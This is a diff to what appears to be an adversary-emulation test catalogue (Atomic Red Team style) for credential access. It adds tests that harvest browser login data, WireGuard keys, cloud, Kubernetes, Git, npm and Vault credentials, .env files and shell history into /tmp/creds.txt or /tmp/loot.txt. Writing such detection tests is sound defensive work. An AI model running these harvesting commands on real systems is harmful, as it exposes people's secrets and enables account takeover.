+          msiexec.exe /i "$path" /qn
+          Start-Sleep -Seconds 100
+          Start-Process -FilePath "C:\Program Files\Google\Chrome\Application\chrome.exe"
           Stop-Process -Name "chrome"
+      - description: 'Chrome login data file must exist
+
+          '
+        prereq_command: if ((Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login
+          Data") -and (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login
+          Data For Account")) {exit 0} else {exit 1}
+        get_prereq_command: |
+          New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" -ItemType Directory -Force -ErrorAction SilentlyContinue
+          New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -ItemType File -Force -ErrorAction SilentlyContinue
+          New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -ItemType File -Force -ErrorAction SilentlyContinue
+      input_arguments:
+        installer_path:
+          description: where the installer will be downloaded to or already is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi
+        download_url:
+          description: url to install Chrome from
+          type: url
+          default: https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
       executor:
         name: powershell
         command: |
           Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
           Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
         cleanup_command: |
+          Get-Package -Name "Google Chrome" | Uninstall-Package -Force
           Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
           Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data For Account" -Force -ErrorAction Ignore
+          Remove-Item -Path "$env:LOCALAPPDATA\Google" -Force -Recurse -ErrorAction Ignore
+          Remove-Item "#{installer_path}" -ErrorAction Ignore
     - name: Simulating access to Opera Login Data
       auto_generated_guid: 28498c17-57e4-495a-b0be-cc1e36de408b
       description: "Simulates an adversary accessing encrypted credentials from Opera
@@ -90569,15 +92628,17 @@ credential-access:
       - description: 'Opera must be installed
 
           '
-        prereq_command: if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe")
-          -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program
-          Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}
+        prereq_command: if (Test-Path "#{installer_path}/../opera.exe")  {exit 0}
+          else {exit 1}
         get_prereq_command: |
-          New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-          $installer = "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"
-          Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe
-          Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
-          Start-Sleep -s 180
+          if (!(Test-Path "#{installer_path}")){
+            $parentpath = Split-Path "#{installer_path}"
+            New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+            (New-Object Net.WebClient).DownloadFile("#{download_url}","#{installer_path}")
+          }
+          $path = Convert-Path -LiteralPath "#{installer_path}"
+          Start-Process $path -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
+          Start-Sleep -s 120
           Stop-Process -Name "opera"
       - description: 'Opera login data file must exist
 
@@ -90588,16 +92649,32 @@ credential-access:
           Data" -ItemType File
 
           '
+      input_arguments:
+        installer_path:
+          description: where the installer will be downloaded to or already is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe
+        download_url:
+          description: url to install Opera from
+          type: url
+          default: https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe
       executor:
         name: powershell
         command: 'Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data"
           -Destination "PathToAtomicsFolder\..\ExternalPayloads"
 
           '
-        cleanup_command: 'Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login
-          Data" -Force -ErrorAction Ignore
-
-          '
+        cleanup_command: |
+          Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction SilentlyContinue
+          $parent_dir = Split-Path "#{installer_path}"
+          Start-Process -FilePath "$parent_dir/opera.exe" -ArgumentList "--uninstall --runimmediately --deleteuserprofile=1" -Wait
+          Remove-Item -Path "$parent_dir/82.0.4227.43" -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path "$parent_dir/assistant" -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path "$parent_dir/installer_prefs*" -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path "$parent_dir/server_tracking_data" -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path "$parent_dir/launcher.exe" -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path "#{installer_path}" -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path "C:\Program Files (x86)\Opera" -Recurse -Force -ErrorAction SilentlyContinue
     - name: Simulating access to Windows Firefox Login Data
       auto_generated_guid: eb8da98a-2e16-4551-b3dd-83de49baa14c
       description: |
@@ -90610,36 +92687,45 @@ credential-access:
       - description: 'Firefox must be installed
 
           '
-        prereq_command: if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe")
-          -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit
-          0} else {exit 1}
+        prereq_command: if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe"))
+          {exit 0} else {exit 1}
         get_prereq_command: |
-          New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-          if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"}else {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US"}
-          $installer = "PathToAtomicsFolder\..\ExternalPayloads\firefoxsetup.exe"
-          (New-Object Net.WebClient).DownloadFile($url,$installer)
-          Start-Process $installer -ArgumentList '/S' -Wait
+          if (!(Test-Path "#{installer_path}")){
+              $parentpath = Split-Path "#{installer_path}"
+              New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+              (New-Object Net.WebClient).DownloadFile("#{download_url}","#{installer_path}")
+            }
+          Start-Process "#{installer_path}" -ArgumentList '/silent' -Wait
       - description: 'Firefox login data file must exist
 
           '
         prereq_command: if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\") {exit
           0} else {exit 1}
         get_prereq_command: |
-          if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox="C:\Program Files\Mozilla Firefox\firefox.exe"}else {$firefox="C:\Program Files (x86)\Mozilla Firefox\firefox.exe"}
+          $firefox="C:\Program Files\Mozilla Firefox\firefox.exe"
           Start-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait
           Start-Process $firefox -NoNewWindow
           Start-Sleep -s 20
           Stop-Process -Name firefox
+      input_arguments:
+        installer_path:
+          description: where the installer will be downloaded to or already is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\firefoxsetup.exe
+        download_url:
+          description: url to install Firefox from
+          type: url
+          default: https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US
       executor:
         name: powershell
         command: 'Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination
           "PathToAtomicsFolder\..\ExternalPayloads" -Force -Recurse
 
           '
-        cleanup_command: 'Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Profiles"
-          -Force -ErrorAction Ignore -Recurse
-
-          '
+        cleanup_command: |
+          Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Profiles" -Force -ErrorAction Ignore -Recurse
+          Start-Process -FilePath "C:\Program Files\Mozilla Firefox\uninstall\helper.exe" -ArgumentList "/S" -Wait
+          Remove-Item -Path "#{installer_path}" -Force -ErrorAction Ignore -Recurse
     - name: Simulating access to Windows Edge Login Data
       auto_generated_guid: a6a5ec26-a2d1-4109-9d35-58b867689329
       description: |
@@ -91298,15 +93384,20 @@ credential-access:
           description: Path where to start searching from.
           type: path
           default: "/"
-        output_file:
-          description: Output file containing locations of SSH key files
-          type: path
-          default: "/tmp/keyfile_locations.txt"
+        filename:
+          description: SSH Key file to search for
+          type: string
+          default: id_rsa
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
         command: |
-          find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}
+          find #{search_path} -name "#{filename}" -type f #{optional_flags} 2>/dev/null
           exit 0
-        cleanup_command: 'rm #{output_file}
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -91699,6 +93790,91 @@ credential-access:
           '
         name: command_prompt
         elevation_required: true
+    - name: Enumerate WireGuard interface credentials with wg showconf
+      auto_generated_guid: e7568442-1b7d-4380-a933-b269d1326b6c
+      description: 'Dump WireGuard interface configurations including private keys
+        and preshared keys using wg showconf. Requires root privileges.
+
+        '
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'wireguard-tools must be installed
+
+          '
+        prereq_command: 'which wg
+
+          '
+        get_prereq_command: "(apt-get install -y wireguard-tools || dnf install -y
+          wireguard-tools || yum install -y wireguard-tools || pacman -S --noconfirm
+          wireguard-tools) && touch /tmp/wireguard_installed\n"
+      executor:
+        command: 'for iface in $(wg show interfaces); do wg showconf "$iface"; done
+
+          '
+        cleanup_command: 'if [ -f /tmp/wireguard_installed ]; then (apt-get remove
+          -y wireguard-tools || dnf remove -y wireguard-tools || yum remove -y wireguard-tools
+          || pacman -R --noconfirm wireguard-tools) && rm -f /tmp/wireguard_installed;
+          fi
+
+          '
+        name: sh
+        elevation_required: true
+    - name: Find WireGuard configuration files
+      auto_generated_guid: 42c55554-3dcb-4df6-8fbb-c8ccacc478d4
+      description: 'Find WireGuard configuration files in /etc/wireguard/, which contain
+        private keys and preshared keys in plaintext. Requires root privileges.
+
+        '
+      supported_platforms:
+      - linux
+      input_arguments:
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find /etc/wireguard -name ''*.conf'' -type f #{optional_flags} 2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+        elevation_required: true
+    - name: Find TLS private key files
+      auto_generated_guid: 5e417277-0ae7-4ad5-a3e8-0fa27c122b29
+      description: |
+        Find TLS private key files on the filesystem by extension.
+        Extensions include *.key, *.pem, *.p12, and *.pfx
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        file_extensions:
+          description: Space-separated TLS key file extensions to search for
+          type: string
+          default: "*.key *.pem *.p12 *.pfx"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'for file_extension in #{file_extensions}; do find #{file_path} -name
+          "$file_extension" -type f #{optional_flags} 2>/dev/null; done
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
   T1557.001:
     technique:
       type: attack-pattern
@@ -93334,7 +95510,7 @@ credential-access:
         output_file:
           description: Path where captured results will be placed
           type: path
-          default: "~/loot.txt"
+          default: "/tmp/loot.txt"
         bash_history_grep_args:
           description: grep arguments that filter out specific commands we want to
             capture
@@ -93347,6 +95523,9 @@ credential-access:
       executor:
         command: 'cat #{bash_history_filename} | grep #{bash_history_grep_args} >
           #{output_file}
+
+          '
+        cleanup_command: 'rm -f #{output_file}
 
           '
         name: sh
@@ -93373,6 +95552,66 @@ credential-access:
           default: "~/.history"
       executor:
         command: 'cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
+
+          '
+        name: sh
+    - name: Search Through Zsh History
+      auto_generated_guid: 8f2765a8-e795-438b-a102-5e25a7adcce1
+      description: 'Search through zsh history for specific commands we want to capture
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: path
+          default: "/tmp/loot.txt"
+        zsh_history_grep_args:
+          description: grep arguments that filter out specific commands we want to
+            capture
+          type: string
+          default: "-e '-p ' -e 'pass' -e 'ssh'"
+        zsh_history_filename:
+          description: Path of the zsh history file to capture
+          type: path
+          default: "~/.zsh_history"
+      executor:
+        command: 'cat #{zsh_history_filename} | grep #{zsh_history_grep_args} > #{output_file}
+
+          '
+        cleanup_command: 'rm -f #{output_file}
+
+          '
+        name: sh
+    - name: Search Through SQL History
+      auto_generated_guid: ce64e135-f186-4c4a-85da-75f6ef71e46f
+      description: 'Search through SQL command line history for specific commands
+        we want to capture
+
+        '
+      supported_platforms:
+      - linux
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: path
+          default: "/tmp/loot.txt"
+        sql_history_grep_args:
+          description: grep arguments that filter out specific commands we want to
+            capture
+          type: string
+          default: "-e 'pass'"
+        sql_history_filename:
+          description: Path of the sh history file to capture
+          type: path
+          default: "~/.mysql_history"
+      executor:
+        command: 'cat #{sql_history_filename} | grep #{sql_history_grep_args} > #{output_file}
+
+          '
+        cleanup_command: 'rm -f #{output_file}
 
           '
         name: sh
@@ -93455,8 +95694,12 @@ credential-access:
           description: Path to search
           type: string
           default: "/"
+        filename:
+          description: Name of the AWS credential file to search for
+          type: string
+          default: credentials
       executor:
-        command: 'find #{file_path}/.aws -name "credentials" -type f 2>/dev/null
+        command: 'find #{file_path} -path ''*/.aws/#{filename}'' -type f 2>/dev/null
 
           '
         name: sh
@@ -93517,8 +95760,8 @@ credential-access:
         elevation_required: true
     - name: Find and Access Github Credentials
       auto_generated_guid: da4f751a-020b-40d7-b9ff-d433b7799803
-      description: 'This test looks for .netrc files (which stores github credentials
-        in clear text )and dumps its contents if found.
+      description: 'Find .netrc files, which store GitHub credentials in clear text,
+        and dump their contents if found.
 
         '
       supported_platforms:
@@ -93528,14 +95771,25 @@ credential-access:
         file_path:
           description: Path to search
           type: string
-          default: "/home"
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: ".netrc"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
-        name: bash
-        elevation_required: false
-        command: 'for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do
-          echo $file ; cat $file ; done
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
 
           '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
     - name: WinPwn - sensitivefiles
       auto_generated_guid: 114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0
       description: Search for sensitive files on this local system using the SensitiveFiles
@@ -93651,9 +95905,21 @@ credential-access:
           description: Path to search
           type: string
           default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: msal_token_cache.json
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
-        command: 'find #{file_path}/.azure -name "msal_token_cache.json" -o -name
-          "accessTokens.json" -type f 2>/dev/null
+        command: 'find #{file_path} -path ''*/.azure/#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -93671,9 +95937,21 @@ credential-access:
           description: Path to search
           type: string
           default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: credentials.db
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
       executor:
-        command: 'find #{file_path}/.config/gcloud -name "credentials.db" -o -name
-          "access_tokens.db" -type f 2>/dev/null
+        command: 'find #{file_path} -path ''*/.config/gcloud/#{filename}'' -type f
+          #{optional_flags} 2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
 
           '
         name: sh
@@ -93695,6 +95973,460 @@ credential-access:
         command: 'find #{file_path}/.oci/sessions -name "token" -type f 2>/dev/null
 
           '
+        name: sh
+    - name: Access Travis CI Config File
+      auto_generated_guid: 5312c7c3-775b-4437-a8b0-914b30cfebd4
+      description: 'Find Travis CI configuration files (.travis.yml), which may contain
+        credentials, secrets, or sensitive environment variables.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: ".travis.yml"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Access Gitlab CI Config File
+      auto_generated_guid: 98618067-a2c7-4d4b-9c89-403a90f43656
+      description: 'Find GitLab CI configuration files (.gitlab-ci.yml), which may
+        contain credentials, secrets, or sensitive environment variables.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: ".gitlab-ci.yml"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Terraform credential files
+      auto_generated_guid: c3372ae9-b9bf-427a-b330-cb04fecb9c1d
+      description: 'Find Terraform credential files which may contain sensitive values
+        such as API keys, passwords, and infrastructure secrets. Searches for both
+        terraform.tfvars and terraform.tfstate.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filenames:
+          description: Space-separated Terraform credential filenames to search for
+          type: string
+          default: terraform.tfvars terraform.tfstate
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'for filename in #{filenames}; do find #{file_path} -name "$filename"
+          -type f #{optional_flags} 2>/dev/null; done
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Docker credentials
+      auto_generated_guid: 5a668739-3a2f-4265-895f-c0e1e0b09eaa
+      description: 'Find local Docker credentials from file, defaults to using / as
+        the look path.
+
+        '
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: config.json
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -path ''*/.docker/#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find HashiCorp Vault token files
+      auto_generated_guid: 2951c09f-b4f9-4248-ba75-6373709ebd55
+      description: 'Find HashiCorp Vault token files (~/.vault-token), which contain
+        plaintext Vault tokens that grant access to secrets stored in Vault.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: ".vault-token"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Access Drone CI Config File
+      auto_generated_guid: a11f22fb-a037-4cc2-bcfc-a133b287aa1b
+      description: 'Find Drone CI configuration files (.drone.yml), which may contain
+        credentials, secrets, or sensitive environment variables used in Drone CI/CD
+        pipelines.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: ".drone.yml"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Dump GitHub Actions Runner Environment Variables from procfs
+      auto_generated_guid: 51cde30c-0311-449a-8e15-542b59f95939
+      description: |
+        Locates GitHub Actions runner processes (Runner.Worker, Runner.Listener, runsvc, run.sh)
+        and reads their environment variables from /proc/<pid>/environ, filtering for keys
+        containing "env" or "ssh". This mirrors TeamPCP malware behavior that harvests
+        credentials and secrets from self-hosted runner processes.
+
+        Reference: https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'for pid in $(pgrep -f ''Runner.Worker|Runner.Listener|runsvc|run.sh''
+          2>/dev/null); do tr ''\0'' ''\n'' < /proc/$pid/environ 2>/dev/null | grep
+          -iE ''env|ssh''; done
+
+          '
+    - name: Search for Git Credential Files
+      auto_generated_guid: c8367142-cbb0-47a4-96c7-ff9969fd64ea
+      description: |
+        Searches the specified directory for a git credential file, which
+        may contain plaintext credentials, access tokens, or credential helper
+        configurations. Example files include .git-credentials and .gitconfig.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: directory to search under
+          type: string
+          default: "/"
+        filename:
+          description: git credential file to search for
+          type: string
+          default: ".git-credentials"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find .env Files Containing Application Credentials
+      auto_generated_guid: bcf8e58a-1cb7-4988-9227-3d3c70751811
+      description: |
+        Searches common web application and service directories for .env files
+        (.env, .env.local, .env.production, .env.development, .env.staging) that may
+        contain credentials such as API keys, database passwords, and service secrets.
+        Adversaries targeting web servers or containerized environments search for these
+        files after gaining host access to harvest application-level credentials.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Space-separated list of directories to search
+          type: string
+          default: "/home /Users /root /opt /srv /var/www /app /data /var/lib /tmp"
+        filename:
+          description: ".env filename pattern to search for"
+          type: string
+          default: ".env*"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'find #{file_path} -maxdepth 6 -name "#{filename}" -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+    - name: Find database credential files
+      auto_generated_guid: e62bccc4-0200-47e9-b40a-4ea5328495b3
+      description: 'Find user-level database credential files. Examples include ~/.pgpass,
+        ~/.my.cnf, and ~/.mongorc.js.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filenames:
+          description: Space-separated database credential filenames to search for
+          type: string
+          default: ".pgpass .my.cnf .mongorc.js"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: |
+          for filename in #{filenames}; do
+            find #{file_path} -name "$filename" -type f #{optional_flags} 2>/dev/null
+          done
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find system database configuration files
+      auto_generated_guid: d1665562-c389-49fc-9cbe-92236816a105
+      description: 'Find system-level database configuration files (/etc/mysql/my.cnf,
+        /etc/redis/redis.conf) which may contain credentials. Requires root privileges.
+
+        '
+      supported_platforms:
+      - linux
+      input_arguments:
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: |
+          find /etc/mysql -name 'my.cnf' -type f #{optional_flags} 2>/dev/null
+          find /etc/redis -name 'redis.conf' -type f #{optional_flags} 2>/dev/null
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        elevation_required: true
+        name: sh
+    - name: Find npm registry credential files
+      auto_generated_guid: 2a24627b-061b-43e6-bece-a5b0638841dd
+      description: 'Find .npmrc files, which may contain plaintext npm registry authentication
+        tokens.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: ".npmrc"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Access Jenkinsfile
+      auto_generated_guid: 18318786-e0c0-4bdf-979f-f022e6f5f2ef
+      description: 'Find Jenkinsfiles, which may contain credentials, secrets, or
+        sensitive environment variables used in Jenkins CI/CD pipelines.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: Jenkinsfile
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Kubernetes user configuration files
+      auto_generated_guid: 14575d1f-16b3-4a0b-8986-540e42e6a6cc
+      description: 'Find Kubernetes user configuration files (~/.kube/config), which
+        contain API server addresses, client certificates, and bearer tokens that
+        grant access to the Kubernetes cluster. Defaults to using / as the search
+        path.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -path ''*/.kube/config'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Kubernetes cluster configuration files
+      auto_generated_guid: af664fc0-0772-4866-a661-d49a22a13487
+      description: 'Find Kubernetes configuration files requiring root privileges,
+        including the root user kubeconfig (~/.kube/config) and cluster-level configuration
+        files in /etc/kubernetes/. These files contain API server addresses, client
+        certificates, and bearer tokens that grant access to the Kubernetes cluster.
+
+        '
+      supported_platforms:
+      - linux
+      input_arguments:
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: |
+          find /root -path '*/.kube/config' -type f #{optional_flags} 2>/dev/null
+          find /etc/kubernetes -name '*.conf' -type f #{optional_flags} 2>/dev/null
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        elevation_required: true
         name: sh
   T1606.001:
     technique:
@@ -96410,7 +99142,14 @@ credential-access:
           type: string
           default: C:\
       executor:
